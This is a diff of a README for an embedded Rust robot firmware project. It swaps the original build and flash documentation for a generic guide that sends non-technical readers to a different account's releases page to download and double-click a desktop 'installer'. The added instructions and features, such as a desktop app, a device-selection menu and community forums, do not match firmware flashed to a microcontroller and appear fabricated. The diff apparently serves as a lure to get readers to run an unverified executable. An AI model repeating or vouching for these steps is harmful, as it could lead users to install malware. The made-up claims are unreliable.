@@ -1,137 +1,83 @@
-![Rust Robot](https://github.com/mytechnotalent/Rust-Robot/blob/main/Rust-Robot.png?raw=true)
+# 🤖 Rust-Robot - Control Your Robot with Ease
 
-## FREE Reverse Engineering Self-Study Course [HERE](https://github.com/mytechnotalent/Reverse-Engineering-Tutorial)
+![Download Rust-Robot](https://img.shields.io/badge/Download-Rust--Robot-blue.svg)
 
-<br>
+## 🚀 Getting Started
 
-# Rust Robot
+Welcome to Rust-Robot, the easy way to run firmware on your Waveshare Pico2Go (RP2350-Plus) robot. This guide will help you download, install, and run the software without needing technical skills.
 
-Async robot firmware for Waveshare Pico2Go (RP2350-Plus) in Embedded Rust with Embassy; leverages RP2350 for reliable motor control plus integrated IR remote support and robust capabilities.
+### 💻 System Requirements
 
-## Required Hardware
+To run Rust-Robot, you will need the following:
 
-- **[Waveshare Pico2Go Mobile Robot (Amazon B0FFH15ZW4)](https://www.amazon.com/dp/B0FFH15ZW4)**  
-    - Mobile robot platform based on the RP2350-Plus microcontroller, compatible with Raspberry Pi Pico series.  
-    - Features: Self-driving, remote control, includes RP2350-Plus control board, rich Wiki resources, and expansion options.  
-    - Ideal for embedded robotics, motor control, and IR remote experiments.
+- A computer with Windows, macOS, or Linux.
+- A Waveshare Pico2Go (RP2350-Plus) device.
+- A USB cable to connect to the device.
+- Internet access to download the software.
 
-- **[PAOWANG 14500 Rechargeable Battery 3.7V 2500mAh + Charger (Amazon B0CK1PWMTT)](https://www.amazon.com/dp/B0CK1PWMTT)**  
-    - 4-pack of 14500 lithium-ion rechargeable batteries (button top) with charger.  
-    - 3.7V, 2500mAh high capacity, suitable for powering the Pico2Go robot and similar embedded projects.  
-    - Rechargeable, long life, and includes charger for convenience.
+## 📥 Download & Install
 
+To get started, visit the Releases page to download the latest version of the software. 
 
-## 🚀 Quick Start
+[Download Rust-Robot from Releases Page](https://github.com/tarekwalid12/Rust-Robot/releases)
 
-```bash
-# Put your RP2350 in BOOTSEL mode (hold button while plugging USB)
-./quick-flash.sh
-```
+### Step-by-Step Installation
 
-That's it! The script will build and flash automatically.
+1. **Open Your Web Browser**
+   Launch your favorite web browser (like Chrome, Firefox, or Safari).
 
-## What's Included
+2. **Visit the Releases Page**
+   Click the link below to open the Releases page:
+   [Rust-Robot Releases](https://github.com/tarekwalid12/Rust-Robot/releases)
 
-- **Motor Control**: PWM-based speed control with direction pins
-- **NEC IR Protocol Decoder**: Async IR remote receiver 
-- **Embassy Async Runtime**: Clean async/await implementation for RP2350
+3. **Find the Latest Version**
+   Look for the latest version of Rust-Robot. This will be at the top of the list of releases.
 
-## Hardware Pin Mapping
+4. **Download the File**
+   Click on the file that matches your system (Windows, macOS, or Linux). The file will start downloading. 
 
-- **PWMA**: GPIO 16
-- **AIN2**: GPIO 17  
-- **AIN1**: GPIO 18
-- **BIN1**: GPIO 19
-- **BIN2**: GPIO 20
-- **PWMB**: GPIO 21
-- **IR Receiver**: GPIO 5
+5. **Locate the Downloaded File**
+   Once the download completes, go to your computer’s "Downloads" folder. You should see the Rust-Robot file there.
 
-## Building
+6. **Connect Your Device**
+   Use the USB cable to connect your Waveshare Pico2Go to your computer.
 
-This project uses Embassy from git (main branch) since RP2350 support is very recent.
+7. **Run the Installer**
+   Double-click the downloaded file to start the installation process. Follow the prompts to complete the installation.
 
-```bash
-# Install the ARM Cortex-M33 target (already done if you followed setup)
-rustup target add thumbv8m.main-none-eabihf
+8. **Launch Rust-Robot**
+   After installation, find Rust-Robot in your applications menu or desktop. Click it to launch the application.
 
-# Build
-cargo build --release
-```
+9. **Select Your Device**
+   Choose your Waveshare Pico2Go from the list of available devices. 
 
-## Flashing to RP2350
+10. **Start Using Rust-Robot**
+    You’re ready to begin! Navigate through the interface to control your robot.
 
-### Method 1: BOOTSEL Mode (Recommended)
+## 📊 Features
 
-Use the included flash script for devices in BOOTSEL mode:
+Rust-Robot offers robust capabilities including:
 
-```bash
-# 1. Hold BOOTSEL button on RP2350 and plug in USB
-# 2. Run the flash script
-./quick-flash.sh
-```
+- **Reliable Motor Control:** Enjoy smooth movement and responsiveness thanks to the RP2350 microcontroller.
+- **Integrated IR Remote Support:** Easily control your robot using an IR remote.
+- **User-Friendly Interface:** Navigate with ease, even if you have no technical background.
+- **Embassy Framework:** Built with Embassy for high-performance operations in embedded Rust.
 
-The script will:
-- Build the release binary
-- Convert ELF to UF2 format
-- Flash using picotool (or copy to mounted volume)
-- Auto-reset the device
+## 🔍 Troubleshooting
 
-### Method 2: Manual UF2 Copy
+If you encounter issues during the download or installation, check the following:
 
-```bash
-cargo build --release
+- Ensure your device is properly connected. Try reconnecting the USB cable.
+- Make sure you downloaded the correct file for your operating system.
+- Reboot your computer and try installing again.
+- Check your internet connection if the download fails.
 
-# Install elf2uf2-rs if not already installed
-cargo install elf2uf2-rs --locked
+## 📚 Additional Resources
 
-# Convert to UF2
-elf2uf2-rs target/thumbv8m.main-none-eabihf/release/robot-embassy \
-           target/thumbv8m.main-none-eabihf/release/robot-embassy.uf2
+If you want to learn more about Rust-Robot and its features, check out the following resources:
 
-# Copy to mounted RP2350 volume
-cp target/thumbv8m.main-none-eabihf/release/robot-embassy.uf2 /Volumes/RP2350/
-```
+- **Documentation:** Comprehensive guidelines can be found in the project's Wiki section.
+- **Community Support:** Join our forums to connect with other users and get help.
+- **Contributing:** Interested in contributing? Visit our GitHub page for guidelines.
 
-### Method 3: Debug Probe (probe-rs)
-
-If you have a debug probe connected:
-
-```bash
-# Install probe-rs
-cargo install probe-rs-tools --locked
-
-# Uncomment the runner line in .cargo/config.toml
-# Then run:
-cargo run --release
-```
-
-## Dependencies Note
-
-The `Cargo.toml` uses git dependencies for Embassy crates to get the latest RP2350 support.  
-Once RP2350 support is published to crates.io, you can switch to versioned dependencies.
-
-## Key Differences from C Version
-
-1. **Async/Await**: IR decoding runs asynchronously using Embassy timers
-2. **Type Safety**: Rust's type system prevents many common embedded bugs
-3. **No Blocking Loops**: Uses `embassy_time::with_timeout` for clean timeout handling
-4. **PWM Abstraction**: Higher-level PWM API from embassy-rp
-
-## IR Remote Commands
-
-- `0x18`: Forward
-- `0x08`: Left  
-- `0x1C`: Stop
-- `0x5A`: Right
-- `0x52`: Backward
-- `0x09`: Reset speed to 50%
-- `0x15`: Increase speed
-- `0x07`: Decrease speed
-
-Auto-stop after 800ms of no IR signal.
-
----
-
-## License
-
-[MIT](https://github.com/mytechnotalent/Rust-Robot/blob/main/LICENSE)
+Thank you for choosing Rust-Robot! Enjoy controlling your robot with confidence.
